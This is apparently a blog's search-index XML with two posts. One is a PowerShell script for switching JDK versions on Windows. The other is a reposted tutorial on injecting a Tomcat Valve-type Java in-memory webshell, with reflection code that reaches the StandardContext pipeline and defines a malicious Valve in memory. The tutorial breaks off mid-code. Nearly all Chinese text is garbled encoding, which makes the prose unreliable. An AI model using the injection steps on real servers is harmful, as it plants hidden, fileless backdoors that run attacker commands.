<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Switch JDK versions in Windows</title>
    <link href="/2025/11/12/Switch%20JDK%20versions%20in%20Windows/"/>
    <url>/2025/11/12/Switch%20JDK%20versions%20in%20Windows/</url>
    
    <content type="html"><![CDATA[<h1 id="Switch-JDK-versions-in-Windows"><a href="#Switch-JDK-versions-in-Windows" class="headerlink" title="Switch JDK versions in Windows"></a>Switch JDK versions in Windows</h1><p>æœ€è¿‘åœ¨å®‰è£…å·¥å…·æ—¶å¸¸å¸¸ç”¨åˆ°ä¸åŒçš„ JDK ç‰ˆæœ¬ï¼Œè€Œæƒ³è¦åˆ‡æ¢å°±å¾—ä¸€æ¡ä¸€æ¡å»ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œå®åœ¨æµªè´¹æ—¶é—´ã€‚å› æ­¤ï¼Œé€šè¿‡ AI + äººå·¥è°ƒè¯•ï¼Œç»ˆäºæ¨å‡ºäº†ä¸€æ¬¾å¯ä»¥è‡ªåŠ¨æ‰«æå·²å®‰è£…çš„æ‰€æœ‰ JDK ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¿«é€Ÿåˆ‡æ¢çš„è„šæœ¬ã€‚</p><h2 id="å†…å®¹ï¼š"><a href="#å†…å®¹ï¼š" class="headerlink" title="å†…å®¹ï¼š"></a>å†…å®¹ï¼š</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># -----------------------------</span><br><span class="hljs-comment"># PowerShell è„šæœ¬ï¼šswitchjdk.ps1</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šåœ¨ Windows ä¸‹å¿«é€Ÿåˆ‡æ¢ Java ç‰ˆæœ¬ï¼ˆè‡ªåŠ¨æ£€æµ‹ + å®‰å…¨åˆ·æ–°ï¼‰</span><br><span class="hljs-comment"># ç”¨æ³•ï¼š PowerShell ç®¡ç†å‘˜æ¨¡å¼ä¸‹ç›´æ¥æ‰§è¡Œï¼š.\switchjdk.ps1</span><br><span class="hljs-comment"># -----------------------------</span><br><br><span class="hljs-comment"># JDK æ ¹ç›®å½•ï¼ˆæ ¹æ®è‡ªå·±çš„ JDK å®‰è£…è·¯å¾„è°ƒæ•´ï¼‰</span><br><span class="hljs-variable">$javaBase</span> = <span class="hljs-string">&quot;D:\Java&quot;</span><br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;ğŸ” æ‰«æåˆ°å·²æœ‰çš„ Java JDK ç‰ˆæœ¬ï¼š&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><br><span class="hljs-comment"># è·å–æ‰€æœ‰ JDK ç›®å½•ï¼ˆæŒ‰åç§°æ’åºï¼Œé˜²æ­¢ç´¢å¼•é”™ä½ï¼‰</span><br><span class="hljs-variable">$jdkList</span> = <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$javaBase</span> <span class="hljs-literal">-Directory</span> |<br>    <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;^jdk&quot;</span> &#125; |<br>    <span class="hljs-built_in">Sort-Object</span> Name<br><br><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> <span class="hljs-variable">$jdkList</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âŒ æœªæ‰¾åˆ°ä»»ä½• JDK ç‰ˆæœ¬ï¼Œè¯·æ£€æŸ¥ç›®å½•ï¼š<span class="hljs-variable">$javaBase</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Red<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment"># æ˜¾ç¤ºå¯é€‰ç‰ˆæœ¬</span><br><span class="hljs-variable">$index</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$jdk</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$jdkList</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$index</span>. <span class="hljs-variable">$</span>(<span class="hljs-variable">$jdk</span>.Name)&quot;</span><br>    <span class="hljs-variable">$index</span>++<br>&#125;<br><br><span class="hljs-comment"># è·å–å½“å‰ JAVA_HOME</span><br><span class="hljs-variable">$currentJavaHome</span> = [<span class="hljs-type">Environment</span>]::GetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$currentJavaHome</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`nğŸ’¡ å½“å‰ç‰ˆæœ¬ä¸ºï¼š<span class="hljs-variable">$currentJavaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`nâš ï¸ å½“å‰ç³»ç»Ÿæœªè®¾ç½® JAVA_HOME&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-comment"># æç¤ºç”¨æˆ·é€‰æ‹©ç‰ˆæœ¬</span><br><span class="hljs-variable">$choice</span> = <span class="hljs-built_in">Read-Host</span> <span class="hljs-string">&quot;`nğŸ‘‰ è¯·é€‰æ‹©è¦æ›´æ¢çš„ JDK åºå·ï¼ˆ1-<span class="hljs-variable">$</span>&#123;jdkList.Count&#125;ï¼‰&quot;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-variable">$choice</span> <span class="hljs-operator">-as</span> [<span class="hljs-built_in">int</span>]) <span class="hljs-operator">-or</span> <span class="hljs-variable">$choice</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$choice</span> <span class="hljs-operator">-gt</span> <span class="hljs-variable">$jdkList</span>.Count) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âŒ æ— æ•ˆé€‰æ‹©ï¼Œæ“ä½œå·²å–æ¶ˆã€‚&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Red<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment"># ç²¾ç¡®å–é€‰ä¸­ç‰ˆæœ¬</span><br><span class="hljs-variable">$selectedJdk</span> = <span class="hljs-variable">$jdkList</span> | <span class="hljs-built_in">Sort-Object</span> Name | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-Index</span> (<span class="hljs-variable">$choice</span> - <span class="hljs-number">1</span>)<br><span class="hljs-variable">$javaHome</span> = <span class="hljs-variable">$selectedJdk</span>.FullName<br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`nâœ… é€‰æ‹©çš„ JDKï¼š<span class="hljs-variable">$javaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><br><span class="hljs-comment"># ä¿®æ”¹ JAVA_HOMEï¼ˆç³»ç»Ÿä¸ç”¨æˆ·çº§ï¼‰</span><br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-variable">$javaHome</span>, <span class="hljs-string">&quot;User&quot;</span>)<br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-variable">$javaHome</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âœ… JAVA_HOME å·²æ›´æ–°ä¸º <span class="hljs-variable">$javaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><br><span class="hljs-comment"># æ›´æ–° Pathï¼šç§»é™¤æ—§ JDK/binï¼Œæ·»åŠ æ–° JDK/bin</span><br><span class="hljs-variable">$oldPath</span> = [<span class="hljs-type">Environment</span>]::GetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-variable">$newPathParts</span> = <span class="hljs-variable">$oldPath</span> <span class="hljs-operator">-split</span> <span class="hljs-string">&#x27;;&#x27;</span> | <span class="hljs-built_in">Where-Object</span> &#123;<br>    (<span class="hljs-variable">$_</span> <span class="hljs-operator">-notmatch</span> <span class="hljs-string">&quot;Java\\jdk&quot;</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$_</span> <span class="hljs-operator">-notmatch</span> <span class="hljs-string">&quot;Java\\jre&quot;</span>)<br>&#125;<br><span class="hljs-variable">$newPath</span> = (<span class="hljs-variable">$newPathParts</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$javaHome</span>\bin&quot;</span>) <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;;&#x27;</span><br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-variable">$newPath</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;ğŸ” ç³»ç»Ÿ Path å·²æ›´æ–°ã€‚&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br><br><span class="hljs-comment"># é€šçŸ¥ç³»ç»Ÿç¯å¢ƒå˜é‡æ›´æ–°ï¼ˆç«‹å³ç”Ÿæ•ˆï¼‰</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$signature</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">[DllImport(&quot;user32.dll&quot;, SetLastError=true, CharSet=CharSet.Auto)]</span><br><span class="hljs-string">public static extern IntPtr SendMessageTimeout(</span><br><span class="hljs-string">    IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam,</span><br><span class="hljs-string">    uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);</span><br><span class="hljs-string">&quot;@</span><br>    <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-MemberDefinition</span> <span class="hljs-variable">$signature</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NativeMethods&quot;</span> <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;WinAPI&quot;</span><br><br>    <span class="hljs-variable">$HWND_BROADCAST</span> = [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]<span class="hljs-number">0</span>xffff<br>    <span class="hljs-variable">$WM_SETTINGCHANGE</span> = <span class="hljs-number">0</span>x1A<br>    <span class="hljs-variable">$result</span> = [<span class="hljs-type">UIntPtr</span>]::Zero<br><br>    [<span class="hljs-built_in">void</span>][<span class="hljs-type">WinAPI.NativeMethods</span>]::SendMessageTimeout(<br>        <span class="hljs-variable">$HWND_BROADCAST</span>, <span class="hljs-variable">$WM_SETTINGCHANGE</span>,<br>        [<span class="hljs-type">UIntPtr</span>]::Zero, <span class="hljs-string">&quot;Environment&quot;</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$result</span><br>    )<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âœ… System environment change broadcasted.&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br>&#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âš ï¸ Broadcast failed (ä½†ç¯å¢ƒå˜é‡å·²æ›´æ–°)&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-comment"># æ›´æ–°å½“å‰ä¼šè¯ç¯å¢ƒå˜é‡</span><br><span class="hljs-variable">$env:JAVA_HOME</span> = <span class="hljs-variable">$javaHome</span><br><span class="hljs-variable">$env:Path</span> = <span class="hljs-variable">$newPath</span><br><br><span class="hljs-comment"># âš™ï¸ æ¸…é™¤ PowerShell å‘½ä»¤ç¼“å­˜ï¼Œç¡®ä¿ç”Ÿæ•ˆæ–°ç‰ˆæœ¬</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Get-Command</span> java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue) &#123;<br>        <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> Function:\java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>        <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> Alias:\java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>    &#125;<br>    <span class="hljs-comment"># æ¸…é™¤ç¼“å­˜è·¯å¾„</span><br>    <span class="hljs-variable">$env:Path</span> = <span class="hljs-variable">$newPath</span><br>    [<span class="hljs-type">System.Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-variable">$newPath</span>, <span class="hljs-string">&quot;Process&quot;</span>)<br>    <span class="hljs-comment"># å¼ºåˆ¶é‡æ–°å®šä½ java å¯æ‰§è¡Œè·¯å¾„</span><br>    <span class="hljs-variable">$null</span> = &amp; where.exe java<br>&#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;âš ï¸ PowerShell ç¼“å­˜åˆ·æ–°å¤±è´¥ï¼Œä½†ç¯å¢ƒå˜é‡å·²æ›´æ–°&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Final check (java -version):&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br>&amp; java <span class="hljs-literal">-version</span><br><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨ï¼š"><a href="#ä½¿ç”¨ï¼š" class="headerlink" title="ä½¿ç”¨ï¼š"></a>ä½¿ç”¨ï¼š</h2><p>é¦–å…ˆå°†ä»¥ä¸Šè„šæœ¬å†…å®¹è¿›è¡Œä¿å­˜ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120812589.png" alt="image-20251112081219320"></p><p>ç‚¹å‡»<code>å¦å­˜ä¸º</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120812372.png" alt="image-20251112081235257"></p><p>ä¸€èˆ¬æ¥è¯´<strong>ä¿å­˜åˆ° JDK çš„å®‰è£…ç›®å½•</strong>å³å¯ï¼Œä¿å­˜ç±»å‹ä¸º <strong><code>æ‰€æœ‰æ–‡ä»¶(*.*)</code></strong> ï¼Œç¼–ç é€‰æ‹© <strong><code>UTF-8 BOM</code></strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120813936.png" alt="image-20251112081321848"></p><p>æœ€å<strong>ä¿å­˜</strong></p><p>å…ˆçœ‹ä¸€ä¸‹æˆ‘å½“å‰çš„ Java ç‰ˆæœ¬å§ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120816302.png" alt="image-20251112081651218"></p><p>ä»¥<strong>ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œ PowerShell</strong>ï¼Œåˆ‡æ¢åˆ°è„šæœ¬æ‰€åœ¨ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120818722.png" alt="image-20251112081803639"></p><p>æ‰§è¡Œ**<code>.\switchjdk.ps1</code>** ï¼Œå°±å¯ä»¥çœ‹åˆ°å½“å‰ç”µè„‘å®‰è£…çš„ JDK ç‰ˆæœ¬å•¦ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120818286.png" alt="image-20251112081848201"></p><p>è¾“å…¥å¯¹åº”çš„åºå·è¿›è¡Œåˆ‡æ¢ï¼š</p><p>æ˜¾ç¤ºå·²åˆ‡æ¢ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120819997.png" alt="image-20251112081948912"></p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªç»ˆç«¯è¿›è¡ŒéªŒè¯ï¼š</p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸåˆ‡æ¢åˆ°æˆ‘ä»¬æƒ³è¦çš„ JDK ç‰ˆæœ¬äº†~</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511120820736.png" alt="image-20251112082027656"></p>]]></content>
    
    
    <categories>
      
      <category>å°å·¥å…·</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°å·¥å…·</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥</title>
    <link href="/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå†…å­˜é©¬â€”â€”Tomcat-Valveå‹çš„ä¸‰ç§æ³¨å…¥"><a href="#Javaå†…å­˜é©¬â€”â€”Tomcat-Valveå‹çš„ä¸‰ç§æ³¨å…¥" class="headerlink" title="Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥"></a>Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥</h1><p><strong>è½¬è½½è‡ªï¼š</strong><a href="https://www.freebuf.com/articles/web/433972.html"><strong>https://www.freebuf.com/articles/web/433972.html</strong></a></p><h2 id="æ ¸å¿ƒåŸç†"><a href="#æ ¸å¿ƒåŸç†" class="headerlink" title="æ ¸å¿ƒåŸç†"></a>æ ¸å¿ƒåŸç†</h2><ul><li>**Tomcat Pipeline &amp; Valveï¼š**Tomcat ä½¿ç”¨è´£ä»»é“¾æ¨¡å¼å¤„ç†è¯·æ±‚ã€‚<code>Pipeline</code>åŒ…å«å¤šä¸ª<code>Valve</code>ï¼Œæ¯ä¸ª<code>Valve</code>è´Ÿè´£ç‰¹å®šä»»åŠ¡ï¼ˆå¦‚è®¤è¯ã€æ—¥å¿—ã€è®¿é—®æ§åˆ¶ï¼‰ã€‚<code>StandardWrapperValve</code>(é€šå¸¸ä½äºé“¾å°¾) æœ€ç»ˆè°ƒç”¨ Servletã€‚</li><li>**<code>StandardContext</code>ï¼š**ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼ŒæŒæœ‰å…¶å¯¹åº”çš„<code>Pipeline</code>å¯¹è±¡ (<code>StandardContext#getPipeline()</code>)ã€‚</li><li>**ç›®æ ‡ï¼š**å°†æ¶æ„<code>Valve</code>æ³¨å…¥åˆ°ç›®æ ‡ Web åº”ç”¨<code>StandardContext</code>çš„<code>Pipeline</code>ä¸­ï¼Œé€šå¸¸æ˜¯æ’å…¥åœ¨<code>StandardContextValve</code>(è´Ÿè´£åº”ç”¨çº§è·¯ç”±) å’Œ<code>StandardWrapperValve</code>(è´Ÿè´£è°ƒç”¨ Servlet) ä¹‹é—´ï¼Œæˆ–è€…å°½å¯èƒ½é å‰ï¼ˆå¦‚ç´§æ¥åœ¨<code>AccessLogValve</code>ä¹‹åï¼‰ã€‚æ¶æ„ Valve çš„<code>invoke()</code>æ–¹æ³•æ£€æŸ¥ç‰¹å®šè¯·æ±‚ç‰¹å¾ï¼ŒåŒ¹é…åˆ™æ‰§è¡Œå‘½ä»¤å¹¶æˆªæ–­ç®¡é“ï¼ˆä¸å†è°ƒç”¨<code>getNext().invoke()</code>ï¼‰ï¼Œç›´æ¥è¿”å›å“åº”ã€‚</li></ul><h2 id="æ³¨å…¥æ–¹å¼è¯¦è§£"><a href="#æ³¨å…¥æ–¹å¼è¯¦è§£" class="headerlink" title="æ³¨å…¥æ–¹å¼è¯¦è§£"></a>æ³¨å…¥æ–¹å¼è¯¦è§£</h2><h3 id="æ–¹å¼ä¸€ï¼šçº¯åå°„æ³¨å…¥ï¼ˆæ— ä¾èµ–ï¼‰"><a href="#æ–¹å¼ä¸€ï¼šçº¯åå°„æ³¨å…¥ï¼ˆæ— ä¾èµ–ï¼‰" class="headerlink" title="æ–¹å¼ä¸€ï¼šçº¯åå°„æ³¨å…¥ï¼ˆæ— ä¾èµ–ï¼‰"></a>æ–¹å¼ä¸€ï¼šçº¯åå°„æ³¨å…¥ï¼ˆæ— ä¾èµ–ï¼‰</h3><ul><li><p><strong>åœºæ™¯ï¼š<strong>æ”»å‡»è€…å·²é€šè¿‡æ¼æ´ï¼ˆå¦‚ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼  Webshellã€å…¶ä»– RCEï¼‰è·å¾—ä»£ç æ‰§è¡Œèƒ½åŠ›ï¼Œä½†</strong>å½“å‰æ‰§è¡Œç¯å¢ƒæ²¡æœ‰ Tomcat çš„<code>catalina.jar</code>ç­‰åº“ä¾èµ–</strong>ï¼ˆä¾‹å¦‚åœ¨<code>Bootstrap ClassLoader</code>æˆ–<code>Common ClassLoader</code>åŠ è½½çš„ç±»ä¸­æ‰§è¡Œï¼‰ã€‚è¿™æ˜¯æœ€é€šç”¨çš„æ–¹å¼ã€‚</p></li><li><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li><p><strong>è·å–å½“å‰çº¿ç¨‹çš„<code>ContextClassLoader</code>(é€šå¸¸æ˜¯<code>WebappClassLoader</code>):</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åå°„è·å–<code>ApplicationContext</code>(å…³é”®):</strong></p><ul><li>Tomcat å°†<code>ApplicationContext</code>å­˜å‚¨åœ¨<code>WebappClassLoader</code>çš„<code>resources</code>å±æ€§ (<code>org.apache.catalina.webresources.StandardRoot</code>) çš„<code>context</code>å±æ€§ä¸­ã€‚</li><li>æˆ–è€…é€šè¿‡<code>ClassLoader</code>çš„<code>resources</code>å±æ€§è·å–<code>WebResourceRoot</code>ï¼Œå†åå°„è·å–å…¶<code>context</code>å±æ€§ã€‚</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// é€šè¿‡ WebappClassLoader è·å– resources (StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br>// é€šè¿‡ StandardRoot è·å– Context (StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> contextField.get(standardRoot)<span class="hljs-comment">; // è¿™å°±æ˜¯ç›®æ ‡ StandardContext</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åå°„è·å–<code>Pipeline</code>å¯¹è±¡ï¼š</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åå°„è·å–<code>addValve</code>æ–¹æ³•ï¼š</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>æ„é€ æ¶æ„ Valve å®ä¾‹ï¼š</strong></p><ul><li>å°†æ¶æ„ Valve çš„å­—èŠ‚ç ï¼ˆç¼–è¯‘åçš„<code>.class</code>æ–‡ä»¶å†…å®¹ï¼‰è½¬æ¢ä¸º<code>byte[]</code>(å¯é€šè¿‡ Class æ–‡ä»¶ç¡¬ç¼–ç ã€è¿œç¨‹åŠ è½½ã€è§£ç ç­‰æ–¹å¼)ã€‚</li><li>ä½¿ç”¨å½“å‰<code>WebappClassLoader</code>çš„<code>defineClass</code>æ–¹æ³•ï¼ˆéœ€åå°„è°ƒç”¨ï¼‰åœ¨å†…å­˜ä¸­å®šä¹‰æ¶æ„ Valve ç±»ã€‚</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// åå°„è°ƒç”¨ protected final defineClass æ–¹æ³•</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">int</span>.<span 